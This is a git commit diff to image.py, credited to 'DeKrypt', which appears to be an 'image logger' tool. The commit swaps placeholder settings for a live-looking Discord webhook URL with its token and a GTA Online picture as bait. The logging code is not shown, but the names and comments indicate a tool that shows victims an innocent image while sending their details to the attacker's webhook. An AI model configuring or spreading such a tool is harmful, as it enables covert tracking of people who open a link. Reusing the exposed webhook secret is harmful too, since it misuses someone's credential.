ef4b8bb6353425485273b44da7df4bd048426db6
KF8878 <justdoo12345@gmail.com>
2025-02-16 19:13:35 +0000

    Update image.py

--- image.py
+++ image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1340749294461780099/yFq_JfGnDE2K3Y6izi-X_2NDFcaTzWFSoYmIzbrnFCV-G01_uE2C8bhRamQQrDWholjh",
+    "image": "https://cdn2.unrealengine.com/gta-online-beginners-guide-tips-vehicles-1920x1080-33dbe0ca2d01.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
